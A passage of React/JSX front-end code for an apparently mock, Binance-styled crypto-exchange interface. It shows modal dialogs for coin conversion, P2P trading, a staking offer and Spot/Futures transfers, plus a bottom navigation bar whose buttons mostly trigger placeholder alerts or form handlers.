                    <option key={sym} value={sym}>{sym} (Avail: {(userCryptoHoldings[sym] || 0).toFixed(2)})</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-gray-400 block mb-1">To Coin</label>
                <select value={convertToCoin} onChange={(e) => setConvertToCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white">
                  {cryptoList.map(c => (
                    <option key={c.symbol} value={c.symbol}>{c.name} ({c.symbol})</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-gray-400 block mb-1">Amount to Convert</label>
                <input type="number" step="any" value={convertAmount} onChange={(e) => setConvertAmount(e.target.value)} placeholder="0.00" required className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white" />
              </div>
              <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Preview Conversion</button>
            </form>
          </div>
        </div>
      )}

      {/* P2P Modal */}
      {modalType === 'p2p' && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-lg space-y-4 max-h-[90vh] overflow-y-auto">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-white text-sm">P2P Express Trading</h3>
              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white font-bold text-base cursor-pointer">✕</button>
            </div>
            <div className="flex gap-2">
              <button onClick={() => setP2pType('buy')} className={`flex-1 py-2 font-bold rounded cursor-pointer ${p2pType === 'buy' ? 'bg-[#0ecb81] text-black' : 'bg-[#181a20] text-gray-400'}`}>Buy</button>
              <button onClick={() => setP2pType('sell')} className={`flex-1 py-2 font-bold rounded cursor-pointer ${p2pType === 'sell' ? 'bg-red-500 text-black' : 'bg-[#181a20] text-gray-400'}`}>Sell</button>
            </div>
            <div className="space-y-3">
              <div className="bg-[#181a20] p-3 rounded border border-gray-800 flex justify-between items-center">
                <div>
                  <div className="font-bold text-white">Merchant: CryptoKing_P2P</div>
                  <div className="text-[10px] text-gray-400">99.8% Completion • 1,420 Orders</div>
                </div>
                <div className="text-right">
                  <div className="font-bold text-[#0ecb81]">1.00 USD / USDT</div>
                  <button onClick={() => alert(`P2P Trade Order initialized successfully!`)} className={`mt-1 px-3 py-1 font-bold text-black rounded text-xs cursor-pointer ${p2pType === 'buy' ? 'bg-[#0ecb81]' : 'bg-red-500'}`}>
                    {p2pType === 'buy' ? 'Buy USDT' : 'Sell USDT'}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Earn Modal */}
      {modalType === 'earn' && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-white text-sm">Binance Simple Earn</h3>
              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white font-bold text-base cursor-pointer">✕</button>
            </div>
            <div className="space-y-3">
              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800 space-y-2">
                <div className="flex justify-between items-center">
                  <span className="font-bold text-white">USDT Flexible Staking</span>
                  <span className="text-[#0ecb81] font-bold">12.5% APR</span>
                </div>
                <p className="text-gray-400 text-[10px]">Earn daily rewards with flexible redemption at any time.</p>
                <button onClick={() => alert('Successfully subscribed to Binance Earn!')} className="w-full bg-[#f0b90b] text-black font-bold p-2 rounded mt-2 cursor-pointer">Subscribe</button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Transfer Modal */}
      {modalType === 'transfer' && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
            <div className="flex justify-between items-center">
              <h3 className="font-bold text-white text-sm">Internal Account Transfer</h3>
              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white font-bold text-base cursor-pointer">✕</button>
            </div>
            <form onSubmit={handleTransferSubmit} className="space-y-3">
              <div>
                <label className="text-gray-400 block mb-1">From</label>
                <select value={transferFrom} onChange={(e) => setTransferFrom(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white">
                  <option value="Spot">Spot Account</option>
                  <option value="Futures">Futures Account</option>
                </select>
              </div>
              <div>
                <label className="text-gray-400 block mb-1">To</label>
                <select value={transferTo} onChange={(e) => setTransferTo(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white">
                  <option value="Futures">Futures Account</option>
                  <option value="Spot">Spot Account</option>
                </select>
              </div>
              <div>
                <label className="text-gray-400 block mb-1">Coin</label>
                <select value={transferCoin} onChange={(e) => setTransferCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white">
                  {cryptoList.map(c => (
                    <option key={c.symbol} value={c.symbol}>{c.symbol}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-gray-400 block mb-1">Amount</label>
                <input type="number" step="any" value={transferAmount} onChange={(e) => setTransferAmount(e.target.value)} placeholder="0.00" required className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white" />
              </div>
              <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Confirm Transfer</button>
            </form>
          </div>
        </div>
      )}

      {/* Bottom Navigation Bar */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#1e2329] border-t border-[#2b313a] flex justify-around py-3 z-40">
        <button onClick={() => setActiveTab('home')} className={`flex flex-col items-center cursor-pointer ${activeTab === 'home' ? 'text-[#f0b90b]' : 'text-gray-400'}`}>
          <span>🏠</span>
          <span className="text-[10px] mt-1">Home</span>
        </button>
        <button onClick={() => setActiveTab('market')} className={`flex flex-col items-center cursor-pointer ${activeTab === 'market' ? 'text-[#f0b90b]' : 'text-gray-400'}`}>
          <span>📊</span>
          <span className="text-[10px] mt-1">Markets</span>
        </button>
        <button onClick={() => setActiveTab('trade')} className={`flex flex-col items-center cursor-pointer ${activeTab === 'trade' ? 'text-[#f0b90b]' : 'text-gray-400'}`}>
          <span>📈</span>
          <span className="text-[10px] mt-1">Trade</span>
        </button>
        <button onClick={() => setActiveTab('futures')} className={`flex flex-col items-center cursor-pointer ${activeTab === 'futures' ? 'text-[#f0b90b]' : 'text-gray-400'}`}>
          <span>⚡</span>
          <span className="text-[10px] mt-1">Futures</span>
        </button>
        <button onClick={() => setActiveTab('assets')} className={`flex flex-col items-center cursor-pointer ${activeTab === 'assets' ? 'text-[#f0b90b]' : 'text-gray-400'}`}>
          <span>💰</span>
          <span className="text-[10px] mt-1">Assets</span>
        </button>
      </div>

    </div>
  );
}